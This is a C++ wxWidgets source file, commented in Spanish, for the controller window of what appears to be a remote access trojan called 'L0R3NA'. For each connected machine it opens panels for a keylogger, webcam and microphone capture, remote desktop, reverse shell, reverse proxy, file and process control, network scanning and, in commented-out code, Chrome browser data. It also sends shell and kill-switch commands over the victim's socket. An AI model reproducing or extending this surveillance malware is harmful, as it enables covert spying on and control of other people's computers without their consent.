#ifdef ___TESTING_NEW_UI

#include "frame_client.hpp"
#include "frame_remote_desktop.hpp"
#include "panel_file_manager.hpp"
#include "panel_process_manager.hpp"
#include "panel_microfono.hpp"
#include "panel_reverse_shell.hpp"
#include "panel_transferencias.hpp"
#include "panel_keylogger.hpp"
#include "panel_camara.hpp"
#include "panel_wmanager.hpp"
#include "panel_informacion.hpp"
#include "panel_usuarios.hpp"
#include "panel_reverse_proxy.hpp"
#include "panel_escaner.hpp"
#include "panel_fun.hpp"
#include "server.hpp"
#include "misc.hpp"

extern Servidor* p_Servidor;
extern std::mutex vector_mutex;

wxBEGIN_EVENT_TABLE(FrameCliente, wxFrame)
    EVT_CLOSE(FrameCliente::OnClose)
    EVT_BUTTON(wxID_ANY, FrameCliente::OnButton)
    EVT_AUINOTEBOOK_PAGE_CLOSE(wxID_ANY, FrameCliente::OnClosePage)
wxEND_EVENT_TABLE()

wxBEGIN_EVENT_TABLE(MyTreeCtrl, wxTreeCtrl)
    EVT_TREE_ITEM_ACTIVATED(EnumIDS::TreeCtrl_ID, MyTreeCtrl::OnItemActivated)
wxEND_EVENT_TABLE()

FrameCliente::FrameCliente(SOCKET _sckSocket, std::string _strID, struct Cliente& _cliente)
    :wxFrame(nullptr, EnumIDS::ID_Panel_Cliente, _strID, wxDefaultPosition, wxSize(WIN_WIDTH, WIN_HEIGHT), wxDEFAULT_FRAME_STYLE & ~(wxRESIZE_BORDER | wxMAXIMIZE_BOX)) {
    
    wxString strTitle = "[";
    strTitle.append(_strID.c_str());
    strTitle.append("] - Admin");
    this->SetTitle(strTitle);

    this->sckCliente = _sckSocket;
    this->strClienteID = _strID.substr(0, _strID.find('/', 0));;

    wxMessageBox(_cliente.mods);


    // Tema de controles
    /*wxColour backgroundTheme(90, 0, 90);
    wxColour foregroundTheme(255, 255, 255);
    wxFont fontTheme(8, wxFONTFAMILY_DEFAULT, wxFONTSTYLE_NORMAL, wxFONTWEIGHT_THIN);*/


    this->SetBackgroundColour(THEME_BACKGROUND_COLOR);

    //////////////////////////////////////////////////
    //Administrador de archivos
    //////////////////////////////////////////////////
    wxPanel* pnl_AdminArchivos = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
    wxStaticBoxSizer* box_admin = new wxStaticBoxSizer(wxVERTICAL, pnl_AdminArchivos, "Administrador de archivos");

    //pnl_AdminArchivos->SetBackgroundColour(backgroundTheme);
    
    box_admin->Add(new panelFileManager(pnl_AdminArchivos, this->sckCliente, _strID, _cliente._strIp), 0, wxALL | wxEXPAND);
    
    pnl_AdminArchivos->SetSizer(box_admin);
    //////////////////////////////////////////////////
    //////////////////////////////////////////////////

    
    //////////////////////////////////////////////////
    //Panel Monitoreo
    //////////////////////////////////////////////////
    wxPanel* pnl_Monitoreo = new wxPanel(this, wxID_ANY, wxDefaultPosition);
    //pnl_Monitoreo->SetBackgroundColour(backgroundTheme);

    wxStaticBoxSizer* box_monitoreo = new wxStaticBoxSizer(wxVERTICAL, pnl_Monitoreo, "Monitoreo");

    wxBoxSizer* box_btns_2 = new wxBoxSizer(wxHORIZONTAL);
    wxButton* btn_Keylogger = new wxButton(pnl_Monitoreo, EnumFrameIDS::BTN_Keylogger, "Keylogger");
    //btn_Keylogger->SetBitmap(wxBitmap(wxT("./keylogger.png"), wxBITMAP_TYPE_PNG));
   

    wxButton* btn_Camara = new wxButton(pnl_Monitoreo, EnumFrameIDS::BTN_Camara, "Camara");
    //btn_Camara->SetBitmap(wxBitmap(wxT("./webcam.png"), wxBITMAP_TYPE_PNG));
    
    box_btns_2->Add(btn_Keylogger, 1, wxALL | wxEXPAND);
    box_btns_2->Add(btn_Camara, 1, wxALL | wxEXPAND);

    box_monitoreo->Add(new panelMicrophone(pnl_Monitoreo, this->sckCliente, this->strClienteID), 1, wxALL | wxEXPAND);
    box_monitoreo->AddSpacer(5);
    box_monitoreo->Add(box_btns_2, 1, wxALL | wxEXPAND);

    pnl_Monitoreo->SetSizer(box_monitoreo);
    //////////////////////////////////////////////////
    //////////////////////////////////////////////////



    //////////////////////////////////////////////////
    //Botones para lanzar modulos
    //////////////////////////////////////////////////
    wxPanel* pnl_Mods = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(200, wxDefaultSize.GetHeight()));
    //pnl_Mods->SetBackgroundColour(backgroundTheme);

    wxStaticBoxSizer* box_mod = new wxStaticBoxSizer(wxVERTICAL, pnl_Mods, "Modulos");

    wxButton* btn_AdmVentanas = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Adm_Ventanas, "Adm. Ventanas");
    wxButton* btn_EscanerRed = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Escaner, "Escaner de Red");
    //btn_EscanerRed->SetBitmap(wxBitmap(wxT("./scan.png"), wxBITMAP_TYPE_PNG));
    wxButton* btn_AdmProcesos = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Adm_Procesos, "Adm. Procesos");
    wxButton* btn_RemoteDesk = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Remote_Desktop, "Escritorio Remoto");
    wxButton* btn_Informacion = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Informacion, "Informacion");
    wxButton* btn_Bromas = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Fun, "Bromas");
    wxButton* btn_Shell = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Shell, "Shell Inversa");
    wxButton* btn_Transferencias = new wxButton(pnl_Mods, EnumFrameIDS::BTN_Transferencias, "Transferencias");
    //btn_Bromas->SetBitmap(wxBitmap(wxT("./prank.png"), wxBITMAP_TYPE_PNG));

    wxGridSizer* btnGrid = new wxGridSizer(4, 2, 5, 5);
    btnGrid->Add(btn_AdmVentanas, 1, wxALL | wxEXPAND);
    btnGrid->Add(btn_EscanerRed, 1, wxALL | wxEXPAND);
    btnGrid->Add(btn_AdmProcesos, 1, wxALL | wxEXPAND);
    btnGrid->Add(btn_RemoteDesk, 1, wxALL | wxEXPAND);
    btnGrid->Add(btn_Informacion, 1, wxALL | wxEXPAND);
    btnGrid->Add(btn_Bromas, 1, wxALL | wxEXPAND);
    btnGrid->Add(btn_Shell, 1, wxALL | wxEXPAND);
    btnGrid->Add(btn_Transferencias, 1, wxALL | wxEXPAND);

    box_mod->Add(btnGrid, 0, wxALL | wxEXPAND);

    pnl_Mods->SetSizer(box_mod);
    //////////////////////////////////////////////////
    //////////////////////////////////////////////////


    //////////////////////////////////////////////////
    //proxy inversa
    //////////////////////////////////////////////////
    wxPanel* pnl_Proxy = new wxPanel(this, wxID_ANY, wxDefaultPosition);
    //pnl_Proxy->SetBackgroundColour(backgroundTheme);

    wxStaticBoxSizer* box_proxy = new wxStaticBoxSizer(wxVERTICAL, pnl_Proxy, "Proxy Inversa");
    
    box_proxy->Add(new panelReverseProxy(pnl_Proxy, this->sckCliente), 1, wxALL | wxEXPAND);

    pnl_Proxy->SetSizer(box_proxy);
    //////////////////////////////////////////////////
    //////////////////////////////////////////////////


    //////////////////////////////////////////////////
    // Panel lateral
    //////////////////////////////////////////////////
    wxPanel* pnl_maquina = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(180, wxDefaultSize.GetHeight()));
    //pnl_maquina->SetBackgroundColour(backgroundTheme);

    wxStaticBoxSizer* maquina_sizer = new wxStaticBoxSizer(wxVERTICAL, pnl_maquina, "Maquina");

    wxFlexGridSizer* lblGrid = new wxFlexGridSizer(7, 2, 1, 1);

    wxStaticText* lblOS = new wxStaticText(pnl_maquina, wxID_ANY, _cliente._strSo, wxDefaultPosition, wxDefaultSize);
    
    wxStaticText* lblUser = new wxStaticText(pnl_maquina, wxID_ANY, strSplit(_cliente._strUser, "@", 1)[0], wxDefaultPosition, wxDefaultSize);
    
    //wxStaticText* lblCPU = new wxStaticText(pnl_maquina, wxID_ANY, _cliente._strCpu, wxDefaultPosition, wxDefaultSize);
    
    wxString strRAM = _cliente._strRAM;
    strRAM += " MB";
    wxStaticText* lblRam = new wxStaticText(pnl_maquina, wxID_ANY, strRAM, wxDefaultPosition, wxDefaultSize);
    
    wxArrayString ips_array;
    for (std::string _vcip : strSplit(_cliente._strIPS, ":[<->]:", 100)) {
        ips_array.push_back(_vcip);
    }
    this->cmdIPS = new wxComboBox(pnl_maquina, wxID_ANY, wxEmptyString, wxDefaultPosition, wxDefaultSize, ips_array /*,wxCB_READONLY*/);
    
    wxStaticText* lblIPExterna = new wxStaticText(pnl_maquina, wxID_ANY, _cliente._strIp, wxDefaultPosition, wxDefaultSize);
    
    wxStaticText* _lblOS = new wxStaticText(pnl_maquina, wxID_ANY, "OS:", wxDefaultPosition, wxDefaultSize);
    
    wxStaticText* _lblUser = new wxStaticText(pnl_maquina, wxID_ANY, "Usuario:", wxDefaultPosition, wxDefaultSize);
    
    wxStaticText* _lblRam = new wxStaticText(pnl_maquina, wxID_ANY, "RAM:", wxDefaultPosition, wxDefaultSize);
    
    wxStaticText* _lblIPlocal = new wxStaticText(pnl_maquina, wxID_ANY, "IPs Locales:", wxDefaultPosition, wxDefaultSize);
   
    wxStaticText* _lblIPExterna = new wxStaticText(pnl_maquina, wxID_ANY, "IP Externa:", wxDefaultPosition, wxDefaultSize);
   
    lblGrid->Add(_lblOS, 0);
    lblGrid->Add(lblOS, 1, wxALL | wxEXPAND);

    lblGrid->Add(_lblUser, 0);
    lblGrid->Add(lblUser, 0, wxALL | wxEXPAND);

    lblGrid->Add(_lblRam, 0);
    lblGrid->Add(lblRam, 1, wxALL | wxEXPAND);

    lblGrid->Add(_lblIPlocal, 0);
    lblGrid->Add(this->cmdIPS, 1, wxALL | wxEXPAND);

    lblGrid->Add(_lblIPExterna, 0);
    lblGrid->Add(lblIPExterna, 1, wxALL | wxEXPAND);

    maquina_sizer->Add(lblGrid, 0, wxALL | wxEXPAND);

    pnl_maquina->SetSizer(maquina_sizer);

    //////////////////////////////////////////////////
    //Log remoto
    //////////////////////////////////////////////////

    wxPanel* pnl_LogRemoto = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
    //pnl_LogRemoto->SetBackgroundColour(backgroundTheme);

    wxStaticBoxSizer* log_sizer = new wxStaticBoxSizer(wxVERTICAL, pnl_LogRemoto, "Log remoto");

    this->txtLog = new wxTextCtrl(pnl_LogRemoto, wxID_ANY, wxEmptyString, wxDefaultPosition, wxSize(wxDefaultSize.GetWidth(), 189), wxTE_MULTILINE | wxTE_READONLY | wxTE_WORDWRAP);
    
    log_sizer->Add(this->txtLog, 0, wxALL | wxEXPAND);
    log_sizer->AddSpacer(10);
    log_sizer->Add(new wxButton(pnl_LogRemoto, EnumFrameIDS::BTN_Limpiar_Log, "Limpiar log"), 0, wxALL | wxEXPAND);

    pnl_LogRemoto->SetSizer(log_sizer);

    //////////////////////////////////////////////////
    //////////////////////////////////////////////////

    //Sizer panel de log e informacion (parte derecha)
    wxBoxSizer* side_panel_sizer = new wxBoxSizer(wxVERTICAL);
    side_panel_sizer->Add(pnl_maquina, 0, wxALL | wxEXPAND);
    side_panel_sizer->Add(pnl_LogRemoto, 0, wxALL | wxEXPAND);

    //Sizer de todos los modulos (parte inferior)
    wxBoxSizer* all_mods = new wxBoxSizer(wxHORIZONTAL);
    all_mods->Add(pnl_Monitoreo, 1, wxALL | wxEXPAND);
    all_mods->AddSpacer(10);
    all_mods->Add(pnl_Mods, 1, wxALL | wxEXPAND);
    all_mods->AddSpacer(10);
    all_mods->Add(pnl_Proxy, 0, wxALL | wxEXPAND);

    //Sizer de admin de archivos + todos los modulos (parte superior izquierda
    wxBoxSizer* dashboard_sizer = new wxBoxSizer(wxVERTICAL);
    dashboard_sizer->Add(pnl_AdminArchivos, 0, wxALL | wxEXPAND, 2);
    dashboard_sizer->AddSpacer(5);
    dashboard_sizer->Add(all_mods);

    /*wxPanel* top_Panel = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxSize(WIN_WIDTH, (WIN_HEIGHT / 2)));
    top_Panel->SetBackgroundColour(backgroundTheme);*/

    wxBoxSizer* top_sizer = new wxBoxSizer(wxHORIZONTAL);
    top_sizer->Add(dashboard_sizer, 0, wxALL | wxEXPAND);
    top_sizer->AddSpacer(10);
    top_sizer->Add(side_panel_sizer);

    //Main Sizer
    wxBoxSizer* main_sizer = new wxBoxSizer(wxVERTICAL);
    main_sizer->Add(top_sizer, 0, wxALL | wxEXPAND);

    this->SetSizer(main_sizer);

    ChangeMyChildsTheme(this, THEME_BACKGROUND_COLOR, THEME_FOREGROUND_COLOR, THEME_FONT_GLOBAL);
    this->ChangeMyChildButtons(this);
}


//FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
//    : wxFrame(nullptr, EnumIDS::ID_Panel_Cliente, ":v", wxDefaultPosition, wxDefaultSize, wxDEFAULT_FRAME_STYLE, strID.substr(0, strID.find('/'))) {
//
//    SetTransparent(245);
//
//    this->sckCliente = sckID;
//    int npos = strID.find('/', 0);
//    this->strClienteID = strID.substr(0, npos);
//    //this->strIP = strIP;
//
//    wxString strTitle = "[";
//    strTitle.append(strID.c_str());
//    strTitle.append("] - Admin");
//    this->SetTitle(strTitle);
//    
//    wxPanel* pnl_Left = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
//    wxPanel* pnl_Right = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
//    
//    this->m_tree = new MyTreeCtrl(pnl_Left, EnumIDS::TreeCtrl_ID,wxDefaultPosition, wxSize(180, 450), this->strClienteID, strIP, sckID);
//    
//    wxTreeItemId rootC           = this->m_tree->AddRoot(                    wxT("CLI"));
//    wxTreeItemId rootAdmin       = this->m_tree->AppendItem(rootC,       wxT("[Admin]"));
//    wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC,         wxT("[Spy]"));
//    wxTreeItemId rootInformation = this->m_tree->AppendItem(rootC, wxT("[Informacion]"));
//    wxTreeItemId rootNetwork     = this->m_tree->AppendItem(rootC,         wxT("[Red]"));
//    wxTreeItemId rootMisc        = this->m_tree->AppendItem(rootC,        wxT("[Misc]"));
//
//    this->m_tree->AppendItem(rootAdmin, wxT("Admin de Archivos"));
//    this->m_tree->AppendItem(rootAdmin, wxT("Admin de Procesos"));
//    this->m_tree->AppendItem(rootAdmin, wxT("Admin de Ventanas"));
//    this->m_tree->AppendItem(rootAdmin,     wxT("Reverse Shell"));
//    this->m_tree->AppendItem(rootAdmin,    wxT("Transferencias"));
//
//    //this->m_tree->AppendItem(rootAdmin, wxT("Persistencia"));
//
//    this->m_tree->AppendItem(rootSurveilance,         wxT("Keylogger"));
//    this->m_tree->AppendItem(rootSurveilance,            wxT("Camara"));
//    this->m_tree->AppendItem(rootSurveilance,         wxT("Microfono"));
//    this->m_tree->AppendItem(rootSurveilance, wxT("Escritorio Remoto"));
//
//    this->m_tree->AppendItem(rootInformation, wxT("Usuarios"));
//    wxTreeItemId rootBrowsers = this->m_tree->AppendItem(rootInformation, wxT("Navegadores"));
//    this->m_tree->AppendItem(rootBrowsers, wxT("Chrome"));
//
//    this->m_tree->AppendItem(rootNetwork, wxT("Proxy Inversa"));
//    this->m_tree->AppendItem(rootNetwork, wxT("Escaner de Red"));
//
//    this->m_tree->AppendItem(rootMisc, wxT("Diversion"));
//
//    //Sizer para hacer el treeview dinamico al hacer resize
//    wxBoxSizer* pnl_left_Sizer = new wxBoxSizer(wxHORIZONTAL);
//    pnl_left_Sizer->Add(this->m_tree, 1, wxEXPAND | wxALL, 2);
//    pnl_Left->SetSizer(pnl_left_Sizer);
//    //----------------------------------------------
//
//    this->m_tree->p_Notebook = new wxAuiNotebook(pnl_Right, wxID_ANY, wxDefaultPosition, wxDefaultSize,
//        wxAUI_NB_CLOSE_ON_ACTIVE_TAB | wxAUI_NB_DEFAULT_STYLE | wxAUI_NB_TAB_EXTERNAL_MOVE | wxNO_BORDER);
//
//    //Sizer para el notebook del lado derecho
//    wxBoxSizer* pnl_right_Sizer = new wxBoxSizer(wxHORIZONTAL);
//    pnl_right_Sizer->Add(this->m_tree->p_Notebook, 1, wxEXPAND | wxALL, 2);
//    pnl_Right->SetSizer(pnl_right_Sizer);
//    //----------------------------------------------
//
//    wxHtmlWindow* html = new wxHtmlWindow(this->m_tree->p_Notebook, wxID_ANY, wxDefaultPosition, wxSize(200, 200));
//    wxString htmlsource = "<center><h2>L0R3NA v0.1</h2><br>#Honduras</center>";
//    html->SetPage(htmlsource);
//    html->SetSize(wxSize(200, 200));
//
//    this->m_tree->p_Notebook->Freeze();
//    this->m_tree->p_Notebook->AddPage(html, ":v", true);
//    this->m_tree->p_Notebook->Thaw();
//    
//    wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);
//
//    sizer->Add(pnl_Left, 0, wxEXPAND | wxALL, 2);
//    sizer->Add(pnl_Right, 1, wxEXPAND | wxALL, 2);
//    
//    this->SetSizerAndFit(sizer);
//
//    SetClientSize(700, 450);
//
//
//#ifdef DEBUG_DESIGN_LIMITS
//    SetBackgroundColour(wxColour(255, 255, 255, 128)); // Establecer el color de fondo
//    pnl_Left->SetBackgroundColour(wxColor(255, 0, 0));
//    pnl_Right->SetBackgroundColour(wxColor(0, 255, 0));
//    html->SetBackgroundColour(wxColor(0, 0, 255));
//#endif
//    
//}


void FrameCliente::ChangeMyChildButtons(wxWindow* parent) {
    wxWindowList& children = parent->GetChildren();
    for (wxWindow* child : children) {
        
        //Es un boton
        if (child->IsKindOf(wxCLASSINFO(wxButton)) || child->IsKindOf(wxCLASSINFO(wxToggleButton))) {
            child->Bind(wxEVT_ENTER_WINDOW, &FrameCliente::OnMouseHover, this);
            child->Bind(wxEVT_LEAVE_WINDOW, &FrameCliente::OnMouseLeave, this);
        }else if (child->IsKindOf(wxCLASSINFO(wxListCtrl))) {
            child->Refresh();
            continue;
        }else if (child->IsKindOf(wxCLASSINFO(wxComboBox))) {
            child->Refresh();
            continue;
        }        
        this->ChangeMyChildButtons(child); // Llamada recursiva para subcontroles
    }
}

void FrameCliente::OnMouseHover(wxMouseEvent& event) {
    wxButton* button = dynamic_cast<wxButton*>(event.GetEventObject());
    if (button) {
        button->SetBackgroundColour(THEME_BACKGROUND_COLOR_HOVER);
        button->SetForegroundColour(THEME_FOREGROUND_COLOR_HOVER);
        button->Refresh();
    }
    event.Skip();
}

void FrameCliente::OnMouseLeave(wxMouseEvent& event) {
    wxButton* button = dynamic_cast<wxButton*>(event.GetEventObject());
    if (button) {
        button->SetBackgroundColour(THEME_BACKGROUND_COLOR);
        button->SetForegroundColour(THEME_FOREGROUND_COLOR);
        button->Refresh();
    }
    event.Skip();
}

void FrameCliente::m_AddRemoteLog(const char* _buffer) {
    wxString strTemp(_buffer);
    strTemp.append(1, '\n');

    this->txtLog->AppendText(strTemp);
}

void FrameCliente::OnClosePage(wxAuiNotebookEvent& event) {
    int closedPage = event.GetSelection();
    wxString pageTitle = this->m_tree->p_Notebook->GetPageText(closedPage);
    if (pageTitle == "Reverse Shell") {
        //Enviar comando para cerrar shell al cerra la tab
        p_Servidor->cChunkSend(this->sckCliente, "exit\r\n", 6, 0, false, EnumComandos::Reverse_Shell_Command);
    }
    event.Skip();
}

void FrameCliente::OnClose(wxCloseEvent& event) {
    int iIndex = p_Servidor->IndexOf(this->strClienteID);

    //Talvez remplazar este por uno que cierre todos los modulos que estan corriendo?
    if (iIndex != -1) {
        p_Servidor->vc_Clientes[iIndex]->m_setFrameVisible(false);
        p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::CLI_KSWITCH);
    }
    event.Skip();
}

void FrameCliente::OnButton(wxCommandEvent& event) {
    const int btnID = event.GetId();
    int iComando = -1;

    if (btnID == EnumFrameIDS::BTN_Keylogger) {
        panelKeylogger* panelKey = new panelKeylogger(this, this->sckCliente, this->strClienteID);
        panelKey->Show();
    } else if (btnID == EnumFrameIDS::BTN_Camara){
        panelCamara* panelCam = new panelCamara(this, this->sckCliente, this->strClienteID);
        panelCam->Show();
    } else if (btnID == EnumFrameIDS::BTN_Adm_Ventanas) {
        panelWManager* panelVentanas = new panelWManager(this, this->sckCliente, this->strClienteID);
        panelVentanas->Show();
    } else if (btnID == EnumFrameIDS::BTN_Adm_Procesos) {
        panelProcessManager* panelProcesos = new panelProcessManager(this, this->sckCliente, this->strClienteID);
        panelProcesos->Show();
    } else if (btnID == EnumFrameIDS::BTN_Informacion) {
        panelInformacion* panelInfo = new panelInformacion(this, this->sckCliente, this->strClienteID);
        panelInfo->Show();
    } else if (btnID == EnumFrameIDS::BTN_Escaner) {
        this->panelScaner = new panelEscaner(this, this->sckCliente, this->strClienteID);
        this->panelScaner->Show();
    } else if (btnID == EnumFrameIDS::BTN_Remote_Desktop) {
        frameRemoteDesktop* frameRemote = new frameRemoteDesktop(this, this->sckCliente, this->strClienteID);
        frameRemote->Show();
    } else if (btnID == EnumFrameIDS::BTN_Fun) {
        panelFun* panelF = new panelFun(this, this->sckCliente, this->strClienteID);
        panelF->Show();
    } else if (btnID == EnumFrameIDS::BTN_Shell) {
        this->panelShell = new panelReverseShell(this, this->sckCliente, this->strClienteID);
        this->panelShell->Show();
    } else if(btnID == EnumFrameIDS::BTN_Transferencias){
        this->panelTransfers = new panelTransferencias(this, this->strClienteID);
        this->panelTransfers->Show();
    } else if (btnID == EnumFrameIDS::BTN_Limpiar_Log) {
        this->txtLog->Clear();
    }
    
}

//Al hacer doble click en uno de los modulos del panel izquierdo
void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
    wxTreeItemId itemID = event.GetItem();
    wxString wStr = GetItemText(itemID);
    
    bool isFound = false;
    //Si el panel/frame ya esta abierto solo hacer focus
    for (int i = 0; i < this->p_Notebook->GetPageCount(); i++) {
        if (this->p_Notebook->GetPageText(i) == wStr) {
            this->p_Notebook->GetPage(i)->SetFocus();
            isFound = true;
            break;
        }
    }
    //GetPageCount
    //if (wStr[0] != '[' && isFound == false) {
    //    this->p_Notebook->Freeze();

    //    if (wStr == "Reverse Shell") {
    //        this->p_Notebook->AddPage(new panelReverseShell(this, this->sckCliente), wStr, true);
    //    } else if (wStr == "Admin de Archivos") {
    //        this->p_Notebook->AddPage(new panelFileManager(this, this->sckCliente, this->strClienteID, this->strClienteIP), wStr, true);
    //    } else if (wStr == "Admin de Procesos") {
    //        this->p_Notebook->AddPage(new panelProcessManager(this, this->sckCliente), wStr, true);
    //    } else if (wStr == "Keylogger") {
    //        this->p_Notebook->AddPage(new panelKeylogger(this, this->sckCliente), wStr, true);
    //    } else if (wStr == "Microfono") {
    //        this->p_Notebook->AddPage(new panelMicrophone(this,this->sckCliente), wStr, true);
    //    } else if (wStr == "Camara") {
    //        this->p_Notebook->AddPage(new panelCamara(this, this->sckCliente), wStr, true);
    //    } else if (wStr == "Escritorio Remoto") {
    //        frameRemoteDesktop* frm_temp = DBG_NEW frameRemoteDesktop(this, this->sckCliente);
    //        frm_temp->Show(true);
    //    } else if (wStr == "Transferencias") {
    //        this->p_Notebook->AddPage(new panelTransferencias(this, this->strClienteID), wStr, true);
    //    } else if (wStr == "Admin de Ventanas") {
    //        this->p_Notebook->AddPage(new panelWManager(this, this->sckCliente, this->strClienteID), wStr, true);
    //    } else if (wStr == "Chrome") {
    //        this->p_Notebook->AddPage(new panelInfoChrome(this, this->sckCliente), wStr, true);
    //    } else if (wStr == "Usuarios") {
    //        this->p_Notebook->AddPage(new panelUsuarios(this, this->sckCliente), wStr, true);
    //    } else if (wStr == "Proxy Inversa") {
    //        this->p_Notebook->AddPage(new panelReverseProxy(this, this->sckCliente), wStr, true);
    //    } else if (wStr == "Escaner de Red") {
    //        this->p_Notebook->AddPage(new panelEscaner(this, this->sckCliente), wStr, true);
    //    } else if (wStr == "Diversion") {
    //        this->p_Notebook->AddPage(new panelFun(this, this->sckCliente), wStr, true);
    //    }

    //    this->p_Notebook->Thaw();
    //} 
}

#endif